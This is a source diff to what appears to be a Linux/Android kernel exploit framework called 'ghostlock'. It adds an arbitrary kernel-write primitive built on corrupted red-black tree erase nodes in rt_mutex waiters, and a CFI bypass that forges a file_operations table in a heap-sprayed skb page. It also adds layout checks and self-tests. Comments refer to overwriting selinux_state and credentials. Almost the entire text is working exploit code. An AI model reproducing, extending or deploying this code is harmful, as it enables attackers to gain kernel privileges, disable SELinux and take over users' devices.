@@ -11,6 +11,28 @@
 using namespace ghostlock;
 
 namespace {
+    /* One payload chunk: `prepare_skb_payload` writes the page as
+     * `SKB_SEND_SIZE / this` identical chunks, and the base address the spray
+     * reports is the first one. The forged fops table must live inside that
+     * first chunk, so `PayloadWriteLayout::value` is bounds-checked against it.
+     * The value is `kernel::ORDER3_SIZE`; it is repeated here because this unit
+     * (and its host test) deliberately stays free of the per-device target
+     * header, which `kernel/constants.hpp` pulls in. */
+    constexpr uintptr_t kPayloadChunkBytes = 0x8000;
+    static_assert(kPayloadChunkBytes == (4096U << 3));
+
+    /* Direct-map bounds. Repeated here for the same reason as the chunk size:
+     * this unit (and its host test) stays free of the per-device target header,
+     * which `kernel/constants.hpp` pulls in via TARGET_CONFIG_H. The acceptance
+     * checks that used to live in the callers (`attack::in_direct_map`) are
+     * duplicated for the modes whose page-derived word reaches kernel memory. */
+    constexpr uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
+    constexpr uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;
+
+    [[nodiscard]] constexpr bool payload_in_direct_map(uintptr_t address) noexcept {
+        return address > kDirectMapBase && address < kDirectMapEnd;
+    }
+
     void store64(unsigned char *p, size_t off, uint64_t value) {
         memcpy(p + off, &value, sizeof(value));
     }
@@ -36,6 +58,15 @@ namespace ghostlock::memory {
                                const WriteRequest &request,
                                const PayloadWriteLayout &layout) noexcept {
         if (waiter.size() < kCompactWaiterBytes) return false;
+        /* Fops / Value only exist in the 6.6 non-compact three-word layout,
+         * which `support::prepare_skb_payload` writes directly: their `pc` is
+         * the node's own `rb_parent_color` field (+0x28 of the waiter), not the
+         * word this compact arm stores at +0x18. Encoding one here would store
+         * the branch node address into the destination instead of the requested
+         * word, so refuse loudly rather than silently mis-write. */
+        if (request.mode == WriteMode::Fops || request.mode == WriteMode::Value) {
+            return false;
+        }
         if (layout.right) {
             return span_store64(waiter, 0x18, layout.right) &&
                    span_store64(waiter, 0x20, 0) &&
@@ -61,6 +92,39 @@ namespace ghostlock::memory {
             .fops = default_fops,
         };
         if (!request || request->mode == WriteMode::Disabled) return layout;
+
+        if (request->mode == WriteMode::Fops) {
+            /* CFI hijack (design D1/D2): the erase node must take the brand-new
+             * "child == NULL, left != NULL" arm of __rb_erase_augmented, which
+             * stores node->__rb_parent_color into *(node->rb_left). So the node
+             * carries parent = the word to write and left = the destination,
+             * and must have right == 0: a non-NULL right child would divert the
+             * erase into the successor cases and store the wrong word at the
+             * wrong place. The arm's second, unavoidable store lands at
+             * value - 8, which is still inside the page we own. */
+            layout.chunk_offset = kFakeFopsTableOffset;
+            layout.value = page_base + kFakeFopsTableOffset;
+            layout.parent = layout.value;
+            layout.right = 0;
+            layout.left = request->target;
+            return layout;
+        }
+
+        if (request->mode == WriteMode::Value) {
+            /* The word to store rides the erase node's `rb_parent_color`, which
+             * is also the field that decides the node's colour: the arm that
+             * stores it is only taken when the node is RED. rb_parent() masks
+             * bit 0 off before using the word as a pointer, and the erase arm
+             * stores `pc` with that same mask applied, so forcing bit 0 to 1 is
+             * what makes the stored word come out exactly as requested.
+             * `rb_left` carries the destination through the right!=0 compact
+             * arm (pc = value, left = target). */
+            layout.value = request->value | 1U;
+            layout.parent = layout.value;
+            layout.right = page_base + 0x100;
+            layout.left = request->target;
+            return layout;
+        }
 
         if (request->preserve_child) {
             layout.right = request->mode == WriteMode::Credential
@@ -90,12 +154,43 @@ namespace ghostlock::memory {
     int32_t payload_write_layout_matches_request(
         const WriteRequest *request, const PayloadWriteLayout *layout) {
         if (!request || !layout || request->mode == WriteMode::Disabled) return 0;
+        if (request->mode == WriteMode::Fops) {
+            /* right must be 0 (the left-child erase arm) and both the carried
+             * word and the destination must be non-zero, so a malformed Fops
+             * request is rejected before a page is sprayed. */
+            return layout->right == 0 && layout->value != 0 && layout->left != 0;
+        }
+        if (request->mode == WriteMode::Value) {
+            /* right != 0 selects the compact arm that stores `value`; the value
+             * must be the requested word with the forced colour bit, and `right`
+             * is the branch node the payload puts at page_base + 0x100, so it
+             * has to be a usable direct-map address rather than anything from
+             * the caller. Nothing from `right` is ever loaded as data. */
+            if (!payload_in_direct_map(layout->right)) return 0;
+            return layout->value == (request->value | 1U) &&
+                   layout->left == request->target;
+        }
         return request->preserve_child ? layout->right != 0 : layout->right == 0;
     }
 
     int32_t payload_write_layout_accepts_page(
         const WriteRequest *request, const PayloadWriteLayout *layout) {
         if (!payload_write_layout_matches_request(request, layout)) return 0;
+        /* The forged fops table has to sit entirely inside the payload page the
+         * erase node lives in, 8-byte aligned. Both are properties of the value
+         * we are about to store, so they are checked here, before the write. */
+        if (request->mode == WriteMode::Fops) {
+            /* The forge has to land in the first `kPayloadChunkBytes` chunk: a
+             * table that ran past the chunk end would only exist as a second
+             * copy, while the address this write stores points at the first,
+             * incomplete one. Checked against the offset the encoder recorded,
+             * not against the absolute address (which cannot distinguish the
+             * chunk-0 table from an identical one in a later chunk). */
+            if ((layout->value & 0x7U) != 0) return 0;
+            if (layout->chunk_offset != kFakeFopsTableOffset) return 0;
+            if (layout->chunk_offset + kFakeFopsTableBytes > kPayloadChunkBytes) return 0;
+            if ((layout->value & (kPayloadChunkBytes - 1U)) != layout->chunk_offset) return 0;
+        }
         /* W1 stores its page-derived value across selinux_state fields. An even
      * byte 2 clears `initialized` and breaks every subsequent SID lookup. */
         if (request->mode == WriteMode::Zero && request->preserve_child &&
@@ -116,6 +211,102 @@ namespace ghostlock::memory {
     }
 
     int32_t payload_builder_fixed_vector_test(void) {
+        /* The CFI hijack arm has no prior art in these vectors: it is the only
+         * mode whose stored word is neither the target nor a page-derived right
+         * word, so it carries its own assertions. */
+        {
+            constexpr uintptr_t page = 0xffffff8800210000ULL;
+            constexpr uintptr_t misc_fops = 0xffffff800226b4e8ULL;
+            const WriteRequest fops = WriteRequest::make(
+                misc_fops, WriteMode::Fops, false);
+            PayloadWriteLayout fops_layout = payload_write_layout(
+                &fops, page, 0x1111, 0x2222, 0xffffff802abfd588ULL);
+            const uintptr_t fake = page + kFakeFopsTableOffset;
+            if (fops_layout.value != fake || fops_layout.parent != fake) return 0;
+            if (fops_layout.right != 0 || fops_layout.left != misc_fops) return 0;
+            /* These three words reach the payload through the 6.6 non-compact
+             * path (`support::prepare_skb_payload`), which stores them straight
+             * into the waiter's `pi_tree.entry`: rb_parent_color = the word to
+             * store, rb_right = 0, rb_left = the destination. That path is not
+             * reachable from a host test, so assert on the layout, and assert
+             * that the compact arm refuses the mode rather than mis-encoding it
+             * at its own +0x18 word. */
+            std::array<unsigned char, kCompactWaiterBytes> compact_probe{};
+            if (encode_compact_waiter(
+                    {reinterpret_cast<std::byte *>(compact_probe.data()),
+                     compact_probe.size()},
+                    fops, fops_layout))
+                return 0;
+            if (!payload_write_layout_matches_request(&fops, &fops_layout)) return 0;
+            if (!payload_write_layout_accepts_page(&fops, &fops_layout)) return 0;
+            /* A table that spills out of the first ORDER3 chunk, or a zero
+             * destination, must be refused rather than written. 0x8000 lands
+             * exactly on the next chunk's boundary, the last offset that still
+             * leaves room for the whole table. */
+            /* A table that is not the one the encoder chose, or that would run
+             * past the end of the sprayed chunk, must be refused rather than
+             * written. */
+            PayloadWriteLayout spilled = fops_layout;
+            spilled.chunk_offset = kPayloadChunkBytes - kFakeFopsTableBytes + 8;
+            spilled.value = page + spilled.chunk_offset;
+            spilled.parent = spilled.value;
+            if (payload_write_layout_accepts_page(&fops, &spilled)) return 0;
+            PayloadWriteLayout moved = fops_layout;
+            moved.chunk_offset = kFakeFopsTableOffset + 0x40;
+            moved.value = page + moved.chunk_offset;
+            moved.parent = moved.value;
+            if (payload_write_layout_accepts_page(&fops, &moved)) return 0;
+            PayloadWriteLayout fits = fops_layout;
+            fits.chunk_offset = kPayloadChunkBytes - kFakeFopsTableBytes;
+            fits.value = page + fits.chunk_offset;
+            fits.parent = fits.value;
+            if (payload_write_layout_accepts_page(&fops, &fits)) return 0;
+            const WriteRequest zero_dest = WriteRequest::make(
+                0, WriteMode::Fops, false);
+            PayloadWriteLayout zero_layout = payload_write_layout(
+                &zero_dest, page, 0x1111, 0x2222, 0);
+            if (payload_write_layout_matches_request(&zero_dest, &zero_layout)) return 0;
+        }
+
+        /* WriteMode::Value: the stored word is the caller's, with the colour
+         * bit forced on in the payload and masked off again by the erase. */
+        {
+            constexpr uintptr_t page = 0xffffff8800210000ULL;
+            constexpr uintptr_t dest = 0xffffff8012345628ULL;
+            /* A realistic vr.ko tag word: low byte carries the tag, bit 0 of the
+             * word is clear, so the forcing is actually exercised. */
+            constexpr uintptr_t flags_word = 0x0000000000006802ULL;
+            const WriteRequest value_write = WriteRequest::make_value(dest, flags_word);
+            PayloadWriteLayout value_layout = payload_write_layout(
+                &value_write, page, 0x1111, 0x2222, 0);
+            /* 6.6 non-compact layout: the erase node's `rb_parent_color` field
+             * (+0x28 of the waiter) is the word that gets stored. */
+            if (value_layout.right == 0) return 0;
+            if (value_layout.value != (flags_word | 1U)) return 0;
+            if (value_layout.parent != (flags_word | 1U)) return 0;
+            if (value_layout.left != dest) return 0;
+            if (!payload_write_layout_matches_request(&value_write, &value_layout)) return 0;
+            if (!payload_write_layout_accepts_page(&value_write, &value_layout)) return 0;
+            /* Every bit of the caller's word survives except the forced one, and
+             * the forced one is what rb_parent() drops. */
+            if ((value_layout.value & ~1ULL) != flags_word) return 0;
+            /* The compact arm must refuse this mode: it would store the branch
+             * node address instead of the requested word. */
+            std::array<unsigned char, kCompactWaiterBytes> compact_probe{};
+            if (encode_compact_waiter(
+                    {reinterpret_cast<std::byte *>(compact_probe.data()),
+                     compact_probe.size()},
+                    value_write, value_layout))
+                return 0;
+            /* Zero is a legal thing to store (that is WriteMode::Zero's job, but
+             * Value must not silently refuse it either). */
+            const WriteRequest zero_value = WriteRequest::make_value(dest, 0);
+            PayloadWriteLayout zero_write_layout = payload_write_layout(
+                &zero_value, page, 0x1111, 0x2222, 0);
+            if (!payload_write_layout_matches_request(&zero_value, &zero_write_layout))
+                return 0;
+        }
+
         static const struct {
             uintptr_t target;
             WriteMode mode;
